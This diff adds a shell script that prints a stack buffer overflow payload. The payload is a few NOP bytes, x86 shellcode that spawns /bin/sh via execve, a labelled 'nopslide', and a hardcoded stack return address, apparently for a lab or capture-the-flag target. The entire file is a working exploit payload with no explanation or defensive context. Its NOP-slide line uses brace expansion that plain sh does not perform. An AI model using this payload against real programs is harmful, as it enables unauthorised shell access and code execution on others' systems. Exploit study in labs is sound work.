@@ -1,0 +1,6 @@
+#!/bin/sh
+
+nop=$(printf '\x90%.0s' {1..86})        #big nopslide
+shellcode="\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"   #shellcode to inject
+retaddr="\x5c\xd5\xff\xff"      #return address to jump into
+echo -en "\x90\x90\x90\x90\x90$shellcode$nop$retaddr"
